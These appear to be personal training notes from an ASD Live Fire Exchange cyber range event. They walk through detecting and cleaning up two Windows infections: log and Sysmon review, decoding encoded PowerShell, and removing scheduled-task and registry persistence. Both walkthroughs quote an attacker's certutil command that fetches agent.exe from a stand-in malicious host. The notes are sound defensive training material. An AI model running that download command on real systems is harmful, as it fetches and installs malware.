<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>

<summary><strong>🌐 LFE 1 Bangalore – Email Dumper</strong></summary>

### 🔎 Scenario: Email Dumper

A suspicious alert has been triggered on a Windows host. The attacker used native Windows tools such as PowerShell and Certutil to drop and execute a payload (`agent.exe`) designed to steal Outlook email data. Your objective is to identify the source of compromise, track how the malware was deployed, and remove its persistence mechanisms.

---

### 📊 Key Event IDs

| Event Source | ID   | Description              |
|--------------|------|--------------------------|
| Sysmon       | 1    | Process Creation         |
| Sysmon       | 3    | Network Connection       |
| Sysmon       | 11   | File Created             |
| Security Log | 4688 | Windows Process Creation |

---

### 🧱 Step 1: Initial Process Review

Use Task Manager or PowerShell to check for suspicious processes:

```powershell
taskmgr
```

```powershell
tasklist | findstr /i "powershell certutil agent cmd"
```

Kill suspicious processes:

```powershell
taskkill /F /PID <PID>
```

Use Process Hacker (if available) to review the process tree:

> Look for:
> ```
> winword.exe → powershell.exe → certutil.exe → agent.exe
> ```

---

### 📜 Step 2: Log Review (Event Viewer or Sysmon)

Open Event Viewer:

```powershell
eventvwr
```

Navigate to:

```
Windows Logs > Security > Event ID 4688
```

Or use Sysmon (if configured) to find:

- **Event ID 1**: Process creation
- **Event ID 11**: File creation (`agent.exe`)
- **Event ID 3**: Outbound connections

Check for execution of:

- `certutil.exe` with URL
- `powershell.exe -enc`
- Creation of agent.exe in Roaming

---

### 🧪 Step 3: Certutil Abuse

Attacker downloads a payload using built-in `certutil`:

```powershell
certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
```

Check typical drop paths:

```powershell
Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming" -Include agent.exe -Recurse
```

Check for file creation via timestamp:

```powershell
Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, CreationTime, LastAccessTime
```

---

### 🧬 Step 4: Obfuscated PowerShell Decoding

Check for encoded PowerShell:

```powershell
powershell.exe -enc <Base64>
```

Decode:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64>"))
```

Look for chained execution commands (e.g., `iex`, `Start-Process`, `DownloadString`).

---

### 🗓 Step 5: Check for Persistence – Scheduled Tasks

List all tasks and identify any that run suspicious commands:

```powershell
schtasks /query /fo LIST /v
```

Check for tasks running `agent.exe`, `powershell`, or `.bat` files.

Remove if confirmed malicious:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 6: Check for Persistence – Registry Autoruns

Query auto-run keys:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Remove malicious entries:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🌐 Step 7: Network Connections

Check for outbound connections or C2 channels:

```powershell
netstat -bano
```

Match PID with:

```powershell
tasklist | findstr <PID>
```

---

### 📂 Step 8: Investigate Email Data Access

Search for email data files likely targeted by the malware:

```powershell
Get-ChildItem -Path "C:\Users" -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
```

Check last access time to confirm if they were read:

```powershell
Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object Name, LastAccessTime
```

---

### ✅ Step 9: Remediation

```powershell
taskkill /F /PID <PID>
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
```

---

### 🧠 Key Takeaways

- Certutil can be weaponised to download files without AV alerts (LOLBAS)
- Outlook `.ost`/`.pst` files can be silently accessed and exfiltrated
- Base64-encoded PowerShell is used to obscure malicious scripts
- Persistence is commonly set via scheduled tasks or registry autoruns
- Event Logs and Sysmon are essential to trace the full execution path

</details>

---

<details>

<summary><strong>🌋 LFE 2 Jakarta – Killer Trojan</strong></summary>

### 🔎 Scenario: Killer Trojan

A Trojan has infected a Windows host. The attacker uses native tools to download and execute the payload, set up persistence, and attempt to communicate externally. Your mission is to identify the infection vector, isolate the binary, confirm persistence, and clean it all up.

---

### 📊 Key Event IDs

| Event Source | ID   | Description              |
|--------------|------|--------------------------|
| Sysmon       | 1    | Process Creation         |
| Sysmon       | 3    | Network Connection       |
| Sysmon       | 11   | File Created             |
| Security Log | 4688 | Windows Process Creation |

---

### 🧱 Step 1: Identify Suspicious Processes

Check for known LOLBAS abuse or unknown executables:

```powershell
tasklist | findstr /i "powershell cmd certutil rundll32 regsvr32 agent"
```

Kill suspected malware:

```powershell
taskkill /F /PID <PID>
```

Inspect parent-child process chain using Process Hacker or Sysmon:

> Example:
> ```
> explorer.exe → powershell.exe → certutil.exe → agent.exe
> ```

---

### 📜 Step 2: Review Logs

Open Event Viewer or use Sysmon:

```powershell
eventvwr
```

Check:

- **Security Log → Event ID 4688**
- **Sysmon → Event ID 1 (Process), 11 (File), 3 (Network)**

Search for:

- certutil execution
- creation of `agent.exe`
- outbound connections to IP addresses

---

### 🧪 Step 3: Certutil Download Detection

Check for file downloads via:

```powershell
certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
```

Confirm presence in:

```powershell
C:\Users\<user>\AppData\Roaming\
```

View file details:

```powershell
Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, LastAccessTime
```

---

### 🧬 Step 4: Decode PowerShell (if used)

If the Trojan was executed via PowerShell `-enc`:

```powershell
powershell.exe -enc <Base64>
```

Decode and analyse:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64>"))
```

---

### 🗓 Step 5: Check Scheduled Task Persistence

List all scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for tasks pointing to `agent.exe`, `.bat`, or obfuscated PowerShell.

Remove suspicious task:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 6: Registry Persistence

Check common run keys:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Delete persistence entry:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🌐 Step 7: Network Connection Analysis

Identify active connections:

```powershell
netstat -bano
```

Then map PIDs to:

```powershell
tasklist | findstr <PID>
```

> Look for C2 communication or reverse shell activity.

---

### 📁 Step 8: Search for Email Data or Artefacts

Check for `.pst`/`.ost` files that may have been targeted or staged for exfil:

```powershell
Get-ChildItem -Path C:\Users -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
```

Check access timestamps:

```powershell
Get-Item "<fullpath>" | Select-Object Name, LastAccessTime
```

---

### ✅ Step 9: Remediate

```powershell
taskkill /F /PID <PID>
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🧠 Key Takeaways

- Certutil was used for payload download — a common red flag
- Registry and scheduled tasks were used to persist the agent
- File access timestamps are key to confirming data staging or theft
- Agent may behave like an info-stealer, focusing on Outlook data
- Use parent-child process maps and Sysmon to trace infection paths

</details>

---
